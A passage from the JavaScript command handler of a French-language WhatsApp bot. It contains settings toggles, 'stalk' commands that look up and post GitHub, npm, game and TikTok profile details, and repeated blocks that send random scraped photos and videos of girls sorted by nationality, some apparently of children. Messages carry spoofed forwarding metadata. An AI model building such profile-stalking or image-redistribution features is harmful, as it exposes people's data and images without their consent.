          body: proto.Message.InteractiveMessage.Body.create({
            text: '> Sylvers Ai\n\n' + gpt.data.response
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image:  fs.readFileSync('./KevFile/theme/sylvers.jpg')}, { upload: Kev.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": `{\"display_text\":\"👀\",\"id\":\"\"}`
            }],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: global.xchannel.jid,
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
await Kev.relayMessage(m.chat, msgs.message, {})
 } catch(e) {
 return replygckev("`*Erreur*`")
}
}
    break
    case 'sc': case 'script': case 'don': case 'donner': case 'cekupdate': case 'updatebot': case 'cekbot': case 'sourcecode': {
let me = m.sender
let teks = `*「  ${global.botname} Script 」*\n\nYouTube: ${global.websitex}\nGitHub: ${global.botscript}\n\nHey @${me.split('@')[0]} 👋\nPensez a faire un don 🍜 👇 https://Wa.me/237656774511`
sendKevMessage(m.chat, { 
text: teks,
mentions:[sender],
contextInfo:{
forwardingScore: 9999999,
isForwarded: true, 
mentionedJid:[sender],
"externalAdReply": {
"showAdAttribution": true,
"renderLargerThumbnail": true,
"title": botname, 
"containsAutoReply": true,
"mediaType": 1, 
"thumbnail": fs.readFileSync("./KevFile/theme/sylvers.jpg"),
"mediaUrl": `${wagc}`,
"sourceUrl": `${wagc}`
}
}
})
}
break
case 'temps-actif': {
            	let lowq = `*Sylvers MD Est En Ligne Depuis:*\n*${runtime(process.uptime())}*`
                replygckev(lowq)
            	}
            break
			case 'ktemps-actif': case 'ktest': case 'kbot': {
				if (text && text.startsWith('--') && TontonKev) {
					let buttonnya = [{
						name: 'single_select',
						buttonParamsJson: {
							title: 'SELECTIONNER',
							sections: [{
								title: 'Parametres Du Bot',
								rows: [
									{ title: 'Anti Appel Oui🟢', description: 'Activer L Anti Appel', id: '.bot anticall on' },
									{ title: 'Anti Appel Non🔴', description: 'Desactiver L Anti Appel', id: '.bot anticall off' },
									{ title: 'Auto Bio Oui🟢', description: 'Activer L Auto Bio', id: '.bot autobio on' },
									{ title: 'Auto Bio Non🔴', description: 'Desactiver L Auto Bio', id: '.bot autobio off' },
									{ title: 'Lecture Auto Oui 🟢', description: 'Activer La Lecture Auto', id: '.bot autoread on' },
									{ title: 'Lecrure Auto Non🔴', description: 'Desactiver La Lecture Auto', id: '.bot autoread off' },
									{ title: 'Ecriture Auto Oui🟢', description: 'Activer L Ecriture Auto', id: '.bot autotype on' },
									{ title: 'Ecriture Auto Non🔴', description: 'Desactiver L Ecriture Auto', id: '.bot autotype off' },
									{ title: 'Lecture Vue Unique Oui🟢', description: 'Activer La Lecture Vue Unique', id: '.bot antiswview on' },
									{ title: 'Lecture Vue Unique Non🔴', description: 'Desactiver La Lecture Vue Unique', id: '.bot antiswview off' },
								]
							}]
						}
					}]
					await Kev.sendButtonMsg(m.chat, 'Parametres Du Bot', Kevinoutimewisher, 'Veuillez selectionner', null, buttonnya, m);
				} else if (text && TontonKev) {
					if (text === 'anticall on') db.settings[botNumber].anticall = true, replygckev('Anti Appel Activey');
					if (text === 'anticall off') db.settings[botNumber].anticall = false, replygckev('Anti Appel Desactivey');
					if (text === 'autobio on') db.settings[botNumber].autobio = true, replygckev('Autobio Activey');
					if (text === 'autobio off') db.settings[botNumber].autobio = false, replygckev('Autobio Desactivey');
					if (text === 'autoread on') db.settings[botNumber].autoread = true, replygckev('Lecture Auto Activee');
					if (text === 'autoread off') db.settings[botNumber].autoread = false, replygckev('Lecture Auto Desactivee');
					if (text === 'autotype on') db.settings[botNumber].autotyping = true, replygckev('Ecriture Auto Activee');
					if (text === 'autotype off') db.settings[botNumber].autotyping = false, replygckev('Ecriture Auto Desactivee');
					if (text === 'antiswview on') db.settings[botNumber].readsw = true, replygckev('Lecture De La Vue Unique Activee');
					if (text === 'antiswview off') db.settings[botNumber].readsw = false, replygckev('Lecture De La Vue Unique Desactivee');
					let settingsBot = Object.entries(db.settings[botNumber]).map(([key, value]) => {
						let qhk = (typeof value === 'boolean') ? (value ? 'on🟢' : 'off🔴') : value;
						return `${key.charAt(0).toUpperCase() + key.slice(1)} : ${qhk}`;
					}).join('\n');
					if (text === 'settings') replygckev(settingsBot);
				} else {
					Kev.sendMessage(m.chat, { text: `*Sylvers MD En Ligne Depuis*\n*${runtime(process.uptime())}*` }, { quoted: m })
				}
			}
			break
case 'ghstalk': case 'githubstalk':{
if (!q) return replygckev(`Exemple ${prefix+command} kenvofc`)
await KevStickWait()
let githubstalk = require('./bibliotheque/scraper')
aj = await githubstalk.githubstalk(`${q}`)
Kev.sendMessage(m.chat, { image: { url : aj.profile_pic }, caption: 
`*/ Github Stalker \\*

Nom D Utilisateur : ${aj.username}
Pseudo : ${aj.nickname}
Bio : ${aj.bio}
Id : ${aj.id}
Nodeid : ${aj.nodeId}
Url Profile : ${aj.profile_pic}
Url Github : ${aj.url}
Type : ${aj.type}
Admin : ${aj.admin}
Company : ${aj.company}
Blog : ${aj.blog}
Localisation : ${aj.location}
Email : ${aj.email}
Public Repo : ${aj.public_repo}
Public Gists : ${aj.public_gists}
Followers : ${aj.followers}
Following : ${aj.following}
Created At : ${aj.ceated_at}
Updated At : ${aj.updated_at}` }, { quoted: m } )
}
break
case 'npmstalk':{
if (!q) return replygckev(`Example ${prefix+command} kenvapi`)
await KevStickWait()
let npmstalk = require('./bibliotheque/scraper')
eha = await npmstalk.npmstalk(q)
replygckev(`*/ Npm Stalker \\*

Nom : ${eha.name}
Version Latest : ${eha.versionLatest}
Version Publish : ${eha.versionPublish}
Version Update : ${eha.versionUpdate}
Latest Dependencies : ${eha.latestDependencies}
Publish Dependencies : ${eha.publishDependencies}
Publish Time : ${eha.publishTime}
Latest Publish Time : ${eha.latestPublishTime}`)
}
break
case 'ffstalk':{
if (!q) return replygckev(`Example ${prefix+command} 946716486`)
await KevStickWait()
let ffstalk = require('./bibliotheque/scraper')
eeh = await ffstalk.ffstalk(`${q}`)
replygckev(`*/ Free Fire Stalker \\*

Id : ${eeh.id}
Nickname : ${eeh.nickname}`)
}
break
			case 'mlstalk': {
if (!q) return replygckev(`Example ${prefix+command} 530793138|8129`)
await KevStickWait()
let mlstalk = require('./bibliotheque/scraper')
let dat = await mlstalk.mlstalk(q.split("|")[0], q.split("|")[1])
replygckev(`*/ Mobile Legend Stalker \\*

Username : ${dat.userName}
Id : ${q.split("|")[0]}
ID Zone: ${q.split("|")[1]}`)
}
break
			case 'tiktokstalk': {
	  if (!text) return replygckev(`Usagername? `)
  let res = await fg.ttStalk(args[0])
  let txt = `
┌──「 *TIKTOK STALK* 
──「 *TIKTOK STALK* 
▢ *🔖Number:* ${res.name}
▢ *🔖Username:* ${res.username}
▢ *👥followers:* ${res.followers}
▢ *🫂following:* ${res.following}
▢ *📌Desc:* ${res.desc}

▢ *🔗 Link* : https://tiktok.com/${res.username}
└────────────`
  await Kev.sendMessage(m.chat, {image: { url: res.profile}, caption: txt}, {quoted: m})
}
break
			case 'tiktokgirl':{
await KevStickWait()
var asupan = JSON.parse(fs.readFileSync('./recherche/media/tiktokvids/tiktokgirl.json'))
var hasil = pickRandom(asupan)
let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `Hey ${m.pushName}\n_*Voici le resultat de: ${command}*_`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ video: { url: hasil.url } }, { upload: Kev.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": `{\"display_text\":\"Next ➡️\",\"id\":\"${prefix + command}\"}`
            }],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: global.xchannel.jid,
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
return await Kev.relayMessage(m.chat, msgs.message, {})
}
break
case 'tiktokghea':{
await KevStickWait()
var gheayubi = JSON.parse(fs.readFileSync('./recherche/media/tiktokvids/gheayubi.json'))
var hasil = pickRandom(gheayubi)
let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `Hey ${m.pushName}
_*Voici le resultat de: ${command}*_`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ video: { url: hasil.url } }, { upload: Kev.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": `{\"display_text\":\"Next ➡️\",\"id\":\"${prefix + command}\"}`
            }],
          }),
contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: global.xchannel.jid,
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
return await Kev.relayMessage(m.chat, msgs.message, {})
}
break
case 'tiktokbocil':{
await KevStickWait()
var bocil = JSON.parse(fs.readFileSync('./recherche/media/tiktokvids/bocil.json'))
var hasil = pickRandom(bocil)
let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `Hey ${m.pushName}
_*Voici le resultat de: ${command}*_`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ video: { url: hasil.url } }, { upload: Kev.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": `{\"display_text\":\"Next ➡️\",\"id\":\"${prefix + command}\"}`
            }],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: global.xchannel.jid,
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
return await Kev.relayMessage(m.chat, msgs.message, {})
}
break
case 'tiktoknukhty':{
await KevStickWait()
var ukhty = JSON.parse(fs.readFileSync('./recherche/media/tiktokvids/ukhty.json'))
var hasil = pickRandom(ukhty)
let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `Hey ${m.pushName}
_*Voici le resultat de: ${command}*_`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ video: { url: hasil.url } }, { upload: Kev.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": `{\"display_text\":\"Next ➡️\",\"id\":\"${prefix + command}\"}`
            }],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: global.xchannel.jid,
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
return await Kev.relayMessage(m.chat, msgs.message, {})
}
break
case 'tiktoksantuy':{
await KevStickWait()
var santuy = JSON.parse(fs.readFileSync('./recherche/media/tiktokvids/santuy.json'))
var hasil = pickRandom(santuy)
let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `Hey ${m.pushName}
_*Voici le resultat de: ${command}*_`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ video: { url: hasil.url } }, { upload: Kev.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": `{\"display_text\":\"Next ➡️\",\"id\":\"${prefix + command}\"}`
            }],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: global.xchannel.jid,
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
return await Kev.relayMessage(m.chat, msgs.message, {})
}
break
case 'tiktokkayes':{
await KevStickWait()
var kayes = JSON.parse(fs.readFileSync('./recherche/media/tiktokvids/kayes.json'))
var hasil = pickRandom(kayes)
let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `Hey ${m.pushName}
_*Voici le resultat de: ${command}*_`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ video: { url: hasil.url } }, { upload: Kev.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": `{\"display_text\":\"Next ➡️\",\"id\":\"${prefix + command}\"}`
            }],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: global.xchannel.jid,
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
return await Kev.relayMessage(m.chat, msgs.message, {})
}
break
case 'tiktokpanrika':{
await KevStickWait()
var rikagusriani = JSON.parse(fs.readFileSync('./recherche/media/tiktokvids/panrika.json'))
var hasil = pickRandom(rikagusriani)
let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `Hey ${m.pushName}
_*Voici le resultat de: ${command}*_`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ video: { url: hasil.url } }, { upload: Kev.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": `{\"display_text\":\"Next ➡️\",\"id\":\"${prefix + command}\"}`
            }],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: global.xchannel.jid,
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
return await Kev.relayMessage(m.chat, msgs.message, {})
}
break
case 'tiktoknotnot':{
await KevStickWait()
var notnot = JSON.parse(fs.readFileSync('./recherche/media/tiktokvids/notnot.json'))
var hasil = pickRandom(notnot)
let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `Hey ${m.pushName}
_*Voici le resultat de: ${command}*_`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ video: { url: hasil.url } }, { upload: Kev.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": `{\"display_text\":\"Next ➡️\",\"id\":\"${prefix + command}\"}`
            }],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: global.xchannel.jid,
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
return await Kev.relayMessage(m.chat, msgs.message, {})
}
break
case 'chinese':{
await KevStickWait()
var notnot = JSON.parse(fs.readFileSync('./recherche/media/tiktokpics/china.json'))
var hasil = pickRandom(notnot)
let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `Hey ${m.pushName}\n_*Voici le resultat de: ${command}*_`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: { url: hasil.url } }, { upload: Kev.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": `{\"display_text\":\"Next ➡️\",\"id\":\"${prefix + command}\"}`
            }],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: global.xchannel.jid,
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
return await Kev.relayMessage(m.chat, msgs.message, {})
}
break
case 'hijab':{
await KevStickWait()
var notnot = JSON.parse(fs.readFileSync('./recherche/media/tiktokpics/hijab.json'))
var hasil = pickRandom(notnot)
let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `Hey ${m.pushName}
_*Voici le resultat de: ${command}*_`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: { url: hasil.url } }, { upload: Kev.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": `{\"display_text\":\"Next ➡️\",\"id\":\"${prefix + command}\"}`
            }],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: global.xchannel.jid,
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
return await Kev.relayMessage(m.chat, msgs.message, {})
}
break
case 'japanese':{
await KevStickWait()
var notnot = JSON.parse(fs.readFileSync('./recherche/media/tiktokpics/japan.json'))
var hasil = pickRandom(notnot)
let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `Hey ${m.pushName}
_*Voici le resultat de: ${command}*_`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: { url: hasil.url } }, { upload: Kev.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": `{\"display_text\":\"Next ➡️\",\"id\":\"${prefix + command}\"}`
            }],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: global.xchannel.jid,
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
return await Kev.relayMessage(m.chat, msgs.message, {})
}
break
case 'korean':{
await KevStickWait()
var notnot = JSON.parse(fs.readFileSync('./recherche/media/tiktokpics/korea.json'))
var hasil = pickRandom(notnot)
let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `Hey ${m.pushName}
_*Voici le resultat de: ${command}*_`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: { url: hasil.url } }, { upload: Kev.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": `{\"display_text\":\"Next ➡️\",\"id\":\"${prefix + command}\"}`
            }],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: global.xchannel.jid,
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
return await Kev.relayMessage(m.chat, msgs.message, {})
}
break
case 'malay':{
await KevStickWait()
var notnot = JSON.parse(fs.readFileSync('./recherche/media/tiktokpics/malaysia.json'))
var hasil = pickRandom(notnot)
let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `Hey ${m.pushName}
_*Voici le resultat de: ${command}*_`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: { url: hasil.url } }, { upload: Kev.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": `{\"display_text\":\"Next ➡️\",\"id\":\"${prefix + command}\"}`
            }],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: global.xchannel.jid,
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
return await Kev.relayMessage(m.chat, msgs.message, {})
}
break
case 'randomgirl':{
await KevStickWait()
var notnot = JSON.parse(fs.readFileSync('./recherche/media/tiktokpics/random.json'))
var hasil = pickRandom(notnot)
let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `Hey ${m.pushName}
_*Voici le resultat de: ${command}*_`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: { url: hasil.url } }, { upload: Kev.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": `{\"display_text\":\"Next ➡️\",\"id\":\"${prefix + command}\"}`
            }],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: global.xchannel.jid,
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
return await Kev.relayMessage(m.chat, msgs.message, {})
}
break
case 'randomboy':{
await KevStickWait()
var notnot = JSON.parse(fs.readFileSync('./recherche/media/tiktokpics/random2.json'))
var hasil = pickRandom(notnot)
let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `Hey ${m.pushName}
_*Voici le resultat de: ${command}*_`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: { url: hasil.url } }, { upload: Kev.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": `{\"display_text\":\"Next ➡️\",\"id\":\"${prefix + command}\"}`
            }],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: global.xchannel.jid,
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
return await Kev.relayMessage(m.chat, msgs.message, {})
}
break
case 'thai':{
await KevStickWait()
var notnot = JSON.parse(fs.readFileSync('./recherche/media/tiktokpics/thailand.json'))
var hasil = pickRandom(notnot)
let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `Hey ${m.pushName}
_*Voici le resultat de: ${command}*_`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: { url: hasil.url } }, { upload: Kev.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": `{\"display_text\":\"Next ➡️\",\"id\":\"${prefix + command}\"}`
            }],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: global.xchannel.jid,
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
return await Kev.relayMessage(m.chat, msgs.message, {})
}
break
case 'vietnamese':{
await KevStickWait()
var notnot = JSON.parse(fs.readFileSync('./recherche/media/tiktokpics/vietnam.json'))
var hasil = pickRandom(notnot)
let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `Hey ${m.pushName}
_*Voici le resultat de: ${command}*_`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: { url: hasil.url } }, { upload: Kev.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": `{\"display_text\":\"Next ➡️\",\"id\":\"${prefix + command}\"}`
            }],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: global.xchannel.jid,
                  newsletterName: ownername,
